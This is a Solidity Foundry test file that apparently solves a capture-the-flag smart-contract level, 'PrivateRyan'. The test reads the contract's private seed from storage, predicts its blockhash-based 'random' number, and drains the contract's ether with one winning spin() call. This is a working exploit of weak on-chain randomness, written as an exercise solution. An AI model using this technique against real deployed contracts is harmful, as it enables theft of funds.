// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
// все данные в блокчейне можно прочитать, даже private
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;
    uint256 constant FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 seed = uint256(vm.load(address(instance), 0));
        uint256 factor = (FACTOR * 100) / 100;
        uint256 blockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));
        uint256 predictedNumber = uint256((uint256(hashVal) / factor)) % 100;
        instance.spin{value: 0.01 ether}(predictedNumber);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
